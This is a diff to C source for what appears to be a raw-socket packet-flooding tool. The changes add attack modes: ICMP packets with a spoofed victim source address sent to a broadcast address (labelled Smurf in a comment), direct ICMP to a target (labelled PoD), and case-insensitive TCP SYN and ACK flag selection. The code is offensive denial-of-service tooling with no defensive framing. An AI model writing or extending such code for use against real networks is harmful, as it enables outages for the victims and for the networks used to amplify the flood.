@@ -16,11 +16,17 @@ void ip_init_header(struct iphdr *ip_hdr, char *dst_ip, char *brc_ip, char proto
 		ip_hdr->saddr = 0;
 		ip_hdr->daddr = inet_addr(dst_ip);
 	}	
-	else if(protocol == 'I'){
+	else if(protocol == 'S'){
 		ip_hdr->protocol = IPPROTO_ICMP;
 		len = sizeof(struct iphdr) + sizeof(struct icmphdr);
 		ip_hdr->saddr = inet_addr(dst_ip); 
 		ip_hdr->daddr = inet_addr(brc_ip);
+	}
+	else if(protocol == 'P'){
+		ip_hdr->protocol = IPPROTO_ICMP;
+		len = sizeof(struct iphdr) + sizeof(struct icmphdr);
+		ip_hdr->saddr = 0;
+		ip_hdr->daddr = inet_addr(dst_ip);
 	}
 
 	ip_hdr->version = 4;
@@ -35,8 +41,11 @@ void ip_init_header(struct iphdr *ip_hdr, char *dst_ip, char *brc_ip, char proto
 
 }
 
-void icmp_init_header(struct iphdr *ip_hdr, struct icmphdr *icmp_hdr, char *dst_ip, char *brc_ip){
-	ip_init_header(ip_hdr, dst_ip, brc_ip, 'I');
+void icmp_init_header(struct iphdr *ip_hdr, struct icmphdr *icmp_hdr, char *dst_ip, char *brc_ip, char mode){
+	char Mode = mode;
+	if(Mode != 'S') Mode = 'P';		// PoD, Smurf attack
+
+	ip_init_header(ip_hdr, dst_ip, brc_ip, Mode);
 
 	// icmp header
 	int sequence = 1;
@@ -62,8 +71,8 @@ void tcp_init_header(struct iphdr *ip_hdr, struct tcphdr *tcp_hdr, struct pseudo
 	tcp_hdr->th_urp = 0;
 
 	// mode----------------------------------------------
-	if(mode == 'A')	tcp_hdr->th_flags = TH_ACK;
-	else if(mode == 'S')	tcp_hdr->th_flags = TH_SYN;
+	if(mode == 'A' || mode == 'a')	tcp_hdr->th_flags = TH_ACK;
+	else if(mode == 'S' || mode == 's')	tcp_hdr->th_flags = TH_SYN;
 	// --------------------------------------------------
 
 	//TCP偽頭部初始化
